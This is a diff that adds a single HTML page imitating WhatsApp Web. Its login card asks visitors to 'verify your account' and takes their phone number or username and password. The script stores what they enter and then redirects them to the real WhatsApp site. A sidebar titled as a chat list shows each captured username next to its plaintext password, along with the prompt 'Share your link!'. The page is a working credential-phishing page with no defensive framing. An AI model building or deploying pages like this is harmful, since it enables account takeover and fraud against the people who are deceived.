@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chats • WhatsApp</title>
+    <style>
+        body {
+            background-color: #111b21;
+            color: #e9edef;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            display: flex;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .sidebar {
+            width: 100%;
+            max-width: 400px;
+            background-color: #111b21;
+            border-right: 1px solid #222d34;
+            display: flex;
+            flex-direction: column;
+        }
+        .header {
+            background-color: #202c33;
+            padding: 15px 20px;
+            font-size: 18px;
+            font-weight: 600;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .chat-list {
+            flex-grow: 1;
+            overflow-y: auto;
+        }
+        .chat-item {
+            display: flex;
+            padding: 12px 15px;
+            align-items: center;
+            border-bottom: 1px solid #222d34;
+            cursor: pointer;
+        }
+        .chat-item:hover {
+            background-color: #202c33;
+        }
+        .avatar {
+            width: 45px;
+            height: 45px;
+            background-color: #00a884;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+            font-size: 18px;
+            color: #fff;
+            margin-right: 15px;
+        }
+        .chat-info {
+            flex-grow: 1;
+        }
+        .chat-name {
+            font-weight: 600;
+            font-size: 16px;
+            margin-bottom: 4px;
+        }
+        .chat-msg {
+            font-size: 13px;
+            color: #8696a0;
+        }
+        .main-chat {
+            flex-grow: 1;
+            background-color: #0b141a;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .login-card {
+            background-color: #202c33;
+            padding: 30px;
+            border-radius: 10px;
+            width: 100%;
+            max-width: 320px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        .login-card h2 {
+            margin-bottom: 20px;
+            font-size: 22px;
+            color: #00a884;
+        }
+        .login-card input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 12px;
+            background-color: #2a3942;
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        .login-card button {
+            width: 100%;
+            padding: 12px;
+            background-color: #00a884;
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            font-weight: bold;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        .login-card button:active {
+            background-color: #01755f;
+        }
+        @media(max-width: 768px) {
+            .main-chat { display: none; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="sidebar">
+        <div class="header">
+            <span>WhatsApp Chats</span>
+            <span style="font-size: 13px; color: #00a884;" id="statusText">Live 🟢</span>
+        </div>
+        <div class="chat-list" id="chatList">
+            <div style="padding: 20px; text-align: center; color: #8696a0;" id="noData">
+                No captured messages yet. Share your link!
+            </div>
+        </div>
+    </div>
+
+    <div class="main-chat" id="viewMode">
+        <div class="login-card">
+            <h2>WhatsApp Web</h2>
+            <p style="font-size: 13px; color: #8696a0; margin-bottom: 20px;">Verify your account to continue chatting</p>
+            <form id="captureForm">
+                <input type="text" id="username" placeholder="Phone number, username or email" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit">Start Chat</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('captureForm');
+        const chatList = document.getElementById('chatList');
+        const noData = document.getElementById('noData');
+
+        window.addEventListener('load', loadSavedChats);
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            const chatData = {
+                username: user,
+                password: pass,
+                time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
+            };
+
+            let chats = JSON.parse(localStorage.getItem('whatsapp_chats') || '[]');
+            chats.unshift(chatData);
+            localStorage.setItem('whatsapp_chats', JSON.stringify(chats));
+
+            window.location.href = "https://www.whatsapp.com";
+        });
+
+        function loadSavedChats() {
+            let chats = JSON.parse(localStorage.getItem('whatsapp_chats') || '[]');
+            if(chats.length > 0) {
+                if(noData) noData.style.display = 'none';
+                chatList.innerHTML = '';
+                chats.forEach(chat => {
+                    const div = document.createElement('div');
+                    div.className = 'chat-item';
+                    div.innerHTML = `
+                        <div class="avatar">${chat.username.charAt(0).toUpperCase()}</div>
+                        <div class="chat-info">
+                            <div class="chat-name">${chat.username}</div>
+                            <div class="chat-msg">Password: ${chat.password}</div>
+                        </div>
+                        <div style="font-size: 11px; color: #8696a0;">${chat.time}</div>
+                    `;
+                    chatList.appendChild(div);
+                });
+            }
+        }
+    </script>
+</body>
+</html>
